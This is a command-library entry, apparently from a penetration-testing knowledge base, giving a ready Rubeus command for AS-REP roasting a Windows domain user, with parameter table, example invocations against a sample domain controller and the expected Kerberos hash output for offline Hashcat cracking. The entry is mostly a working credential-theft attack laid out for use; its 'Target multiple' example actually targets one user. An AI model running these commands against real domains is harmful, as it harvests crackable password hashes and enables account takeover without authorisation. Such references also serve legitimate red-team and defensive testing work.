---
id: 544bbcbc-f2ce-4a11-ba65-a234bda31254
name: rubeus-asreproast-hashcat-format
type: command
executor: powershell
data: >-
  Rubeus.exe asreproast /user:$_USERNAME /domain:$_DOMAIN /dc:$_TARGET_IP
  /format:hashcat /outfile:$_OUTPUT_FILE.txt
output: null
created_at: '2023-01-11T20:48:08.563936+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - asrep-roasting
  - kerberos
verified: true
validated: true
---

# rubeus-asreproast-hashcat-format

## Command

```powershell
Rubeus.exe asreproast /user:$_USERNAME /domain:$_DOMAIN /dc:$_TARGET_IP /format:hashcat /outfile:$_OUTPUT_FILE.txt
```

## Description

This command uses Rubeus to perform AS-REP roasting on a specific user, requesting an AS-REP ticket and exporting the hash in Hashcat format for offline cracking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:$_USERNAME | Target username | Yes |
| /domain:$_DOMAIN | Domain name | Yes |
| /dc:$_TARGET_IP | Domain controller IP | Yes |
| /format:hashcat | Output format (hashcat, John) | No |
| /outfile:$_OUTPUT_FILE.txt | Save hash to file | No |

## Examples

### Basic Usage

```powershell
Rubeus.exe asreproast /user:targetuser /domain:corp.local /dc:10.10.10.10 /format:hashcat
```

### Advanced Usage

Target multiple: `Rubeus.exe asreproast /user:targetuser /domain:corp.local /dc:10.10.10.10 /format:hashcat /outfile:hashes.txt`

## Expected Output

`[+] Action: ASREPRoast
[i] Output format: Hashcat
$krb5asrep$23$targetuser@CORP.LOCAL:encrypted_hash`

## Related

- [[procedures/ASREPRoast-Users-Without-Preauthentication-Using-Username]]
- [[tools/Rubeus]]
